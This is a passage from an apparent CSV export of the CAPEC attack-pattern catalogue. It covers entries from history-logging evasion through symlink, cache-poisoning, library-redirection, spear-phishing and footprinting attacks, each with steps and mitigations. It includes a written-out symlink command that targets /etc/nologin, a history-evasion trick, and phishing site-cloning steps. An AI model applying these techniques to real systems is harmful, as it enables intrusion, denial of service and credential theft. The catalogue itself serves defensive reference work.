commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that ls will not be saved, but ls would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.::\",\"::353::285::302::74::15::73::20::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1562.003:ENTRY NAME:Impair Defenses:Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.006:ENTRY NAME:Hijack Execution Flow:Dynamic Linker Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow:Path Interception by PATH Environment Variable::\",\"\",\n130,\"Excessive Allocation\",Meta,Stable,\"An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.\",\"\",Medium,Medium,\"\",\"\",\"::The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.::\",\"::Limit the amount of resources that are accessible to unprivileged users.::Assume all input is malicious. Consider all potentially relevant properties when validating input.::Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::Use resource-limiting settings, if possible.::\",\"::In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.::\",\"::404::770::1325::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.003:ENTRY NAME:Endpoint Denial of Service:Application Exhaustion Flood::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n131,\"Resource Leak Exposure\",Meta,Stable,\"An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests.\",\"\",Medium,Medium,\"\",\"\",\"::The target must have a resource leak that the adversary can repeatedly trigger.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful resource leak exposure attack compromises the availability of the target system's services.::\",\"::If possible, leverage coding language(s) that do not allow this weakness to occur (e.g., Java, Ruby, and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).::Memory should always be allocated/freed using matching functions (e.g., malloc/free, new/delete, etc.)::Implement best practices with respect to memory management, including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.::\",\"\",\"::404::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n132,\"Symlink Attack\",Detailed,Draft,\"An adversary positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Adversary identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.:TECHNIQUE:The adversary writes to files in different directories to check whether the application has sufficient checking before file operations.:TECHNIQUE:The adversary creates symlinks to files in different directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Try to create symlinks to different files] The adversary then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.:TECHNIQUE:The adversary monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the adversary can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.:TECHNIQUE:The adversary may need a little guesswork on the filenames on which the target application would operate.:TECHNIQUE:The adversary tries to create symlinks to the various filenames.::STEP:3:PHASE:Exploit:DESCRIPTION:[Target application operates on created symlinks to sensitive files] The adversary is able to create symlinks to sensitive files while the target application is operating on the file.:TECHNIQUE:Create the symlink to the sensitive file such as configuration files, etc.::\",\"::The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The adversary must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.::\",\"::SKILL:To create symlinks:LEVEL:Low::SKILL:To identify the files and create the symlinks during the file operation time window:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.::Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.::\",\"::The adversary creates a symlink with the same name as the file which the application is intending to write to. The application will write to the file- causing the data to be written where the symlink is pointing. An attack like this can be demonstrated as follows: root# vulprog myFile {...program does some processing...] adversary# ln –s /etc/nologin myFile [...program writes to 'myFile', which points to /etc/nologin...] In the above example, the root user ran a program with poorly written file handling routines, providing the filename myFile to vulnprog for the relevant data to be written to. However, the adversary happened to be looking over the shoulder of root at the time, and created a link from myFile to /etc/nologin. The attack would make no user be able to login.::\",\"::59::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.009:ENTRY NAME:Boot or Logon Autostart Execution:Shortcut Modification::\",\"\",\n141,\"Cache Poisoning\",Standard,Draft,\"An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:161::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.:TECHNIQUE:Run tools that check available entries in the cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.:TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, they are able to manipulate and interpose malicious response data to targeted victim queries.:TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).:TECHNIQUE:Adversary-in-the-Middle attacks (CAPEC-94) intercept secure communication between two parties.::\",\"::The attacker must be able to modify the value stored in a cache to match a desired value.::The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.::\",\"::SKILL:To overwrite/modify targeted cache:LEVEL:Medium::\",\"\",\"\",\"\",\"::Configuration: Disable client side caching.::Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes.::\",\"::In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::\",\"::348::345::349::346::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557.002:ENTRY NAME:Adversary-in-the-Middle: ARP Cache Poisoning::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cache Poisoning::\",\"\",\n142,\"DNS Cache Poisoning\",Detailed,Draft,\"A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:89::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.:TECHNIQUE:Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.:TECHNIQUE:Figure out if the client's browser has DNS cache enabled.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.:TECHNIQUE:Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.:TECHNIQUE:If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction:TECHNIQUE:Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.:TECHNIQUE:Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.:TECHNIQUE:Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties.::\",\"::A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.::\",\"::SKILL:To overwrite/modify targeted DNS cache:LEVEL:Medium::\",\"::The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.::\",\"\",\"\",\"::Configuration: Make sure your DNS servers have been updated to the latest versions::Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.::Configuration: Disable client side DNS caching.::\",\"::In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::\",\"::348::345::349::346::350::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1584.002:ENTRY NAME:Compromise Infrastructure: DNS Server::\",\"\",\n148,\"Content Spoofing\",Meta,Stable,\"An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.\",\"\",Medium,Medium,\"\",\"\",\"::The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which they are not authorized. If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.::\",\"\",\"::If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications. In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:A successful content spoofing attack compromises the integrity of the application data.::\",\"\",\"\",\"::345::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1491:ENTRY NAME:Defacement::::TAXONOMY NAME:WASC:ENTRY ID:12:ENTRY NAME:Content Spoofing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Content Spoofing::\",\"\",\n150,\"Collect Data from Common Resource Locations\",Standard,Draft,\"An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"::The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.::\",\"\",\"\",\"\",\"::An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device’s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time.::\",\"::552::1239::1258::1266::1272::1323::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1003:ENTRY NAME:OS Credential Dumping::::TAXONOMY NAME:ATTACK:ENTRY ID:1119:ENTRY NAME:Automated Collection::::TAXONOMY NAME:ATTACK:ENTRY ID:1213:ENTRY NAME:Data from Information Repositories::::TAXONOMY NAME:ATTACK:ENTRY ID:1530:ENTRY NAME:Data from Cloud Storage Object::::TAXONOMY NAME:ATTACK:ENTRY ID:1555:ENTRY NAME:Credentials from Password Stores::::TAXONOMY NAME:ATTACK:ENTRY ID:1602:ENTRY NAME:Data from Configuration Repository::\",\"\",\n158,\"Sniffing Network Traffic\",Detailed,Draft,\"In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:157::\",\"\",\"::The target must be communicating on a network protocol visible by a network sniffing application.::The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication.::\",\"::SKILL:Adversaries can obtain and set up open-source network sniffing tools easily.:LEVEL:Low::\",\"::A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Obfuscate network traffic through encryption to prevent its readability by network sniffers.::Employ appropriate levels of segmentation to your network in accordance with best practices.::\",\"\",\"::311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::::TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n159,\"Redirect Access to Libraries\",Standard,Stable,\"An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:154::NATURE:CanPrecede:CAPEC ID:185::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] The adversary identifies the target application and determines what libraries are being used.:TECHNIQUE:Find public source code and identify library dependencies.:TECHNIQUE:Gain access to the system hosting the application and look for libraries in common locations.::STEP:2:PHASE:Experiment:DESCRIPTION:[Deploy Malicious Libraries] The adversary crafts malicious libraries and deploys them on the system where the application is running, or in a remote location that can be loaded by the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect Library Calls to Malicious Library] Once the malicious library crafted by the adversary is deployed, the adversary will manipulate the flow of the application such that it calls the malicious library. This can be done in a variety of ways based on how the application is loading and calling libraries.:TECHNIQUE:Poison the DNS cache of the system so that it loads a malicious library from a remote location hosted by the adversary instead of the legitimate location:TECHNIQUE:Create a symlink that tricks the application into thinking that a malicious library is the legitimate library.:TECHNIQUE:Use DLL side-loading to place a malicious verison of a DLL in the windows directory.::\",\"::The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.::\",\"::SKILL:To modify the entries in the configuration file pointing to malicious libraries:LEVEL:Low::SKILL:To force symlink and timing issues for redirecting access to libraries:LEVEL:Medium::SKILL:To reverse engineering the libraries and inject malicious code into the libraries:LEVEL:High::\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Restrict the permission to modify the entries in the configuration file.::Implementation: Check the integrity of the dynamically linked libraries before use them.::Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.::\",\"::In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... • mark the text segment writeable • save the PLT(GOT) entry • replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... • do the payload of the new lib call • restore the original PLT(GOT) entry • call the lib call • save the PLT(GOT) entry again (if its changed) • replace the PLT(GOT) entry with the address of the new lib call::\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.008:ENTRY NAME:Hijack Execution Flow:Path Interception by Search Order Hijacking::\",\"\",\n163,\"Spear Phishing\",Detailed,Draft,\"An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.:TECHNIQUE:Conduct web searching research of target. See also: CAPEC-118.:TECHNIQUE:Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.:TECHNIQUE:Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.:TECHNIQUE:Collect social information via dumpster diving. See also: CAPEC-406.:TECHNIQUE:Collect social information via traditional sources. See also: CAPEC-118.:TECHNIQUE:Collect social information via Non-traditional sources. See also: CAPEC-118.::STEP:2:PHASE:Experiment:DESCRIPTION:[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).:TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:3:PHASE:Experiment:DESCRIPTION:[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look at feel, but contain completely new content.::STEP:4:PHASE:Experiment:DESCRIPTION:[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has their website which duplicates a legitimate website, they need to build very custom user related information in it. For example, they could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.:TECHNIQUE:Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.::STEP:5:PHASE:Exploit:DESCRIPTION:[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:6:PHASE:Exploit:DESCRIPTION:[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.:TECHNIQUE:Log in to the legitimate site using another user's supplied credentials.::\",\"::None. Any user can be targeted by a Spear Phishing attack.::\",\"::SKILL:Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc).:LEVEL:Medium::\",\"::An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Information Leakage::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges:NOTE:Privilege Escalation::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:Data Modification::\",\"::Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.::\",\"::The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.::An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a Pass The Hash attack.::\",\"::451::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1534:ENTRY NAME:Internal Spearfishing::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.001:ENTRY NAME:Phishing: Spearfishing Attachment::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.002:ENTRY NAME:Phishing: Spearfishing Link::::TAXONOMY NAME:ATTACK:ENTRY ID:1566.003:ENTRY NAME:Phishing: Spearfishing via Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.001:ENTRY NAME:Phishing for Information: Spearfishing Service::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.002:ENTRY NAME:Phishing for Information: Spearfishing Attachment::::TAXONOMY NAME:ATTACK:ENTRY ID:1598.003:ENTRY NAME:Phishing for Information: Spearfishing Link::\",\"\",\n165,\"File Manipulation\",Meta,Draft,\"An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.\",\"\",,Medium,\"\",\"\",\"::The target must use the affected file without verifying its integrity.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. In some cases, tools can be used to better control the response of the targeted application to the modified file.::\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.003:ENTRY NAME:Masquerading: Rename System Utilities::\",\"\",\n169,\"Footprinting\",Meta,Stable,\"An adversary engages in probing and exploration activities to identify constituents and properties of the target.\",\"\",High,Very Low,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.:TECHNIQUE:Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.:TECHNIQUE:Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.:TECHNIQUE:DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.:TECHNIQUE:Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.::\",\"::An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.::\",\"::SKILL:The adversary knows how to send HTTP request, run the scan tool.:LEVEL:Low::\",\"::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Keep patches up to date by installing weekly or daily if possible.::Shut down unnecessary services/ports.::Change default passwords by choosing strong passwords.::Curtail unexpected input.::Encrypt and password-protect sensitive data.::Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.::\",\"::In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 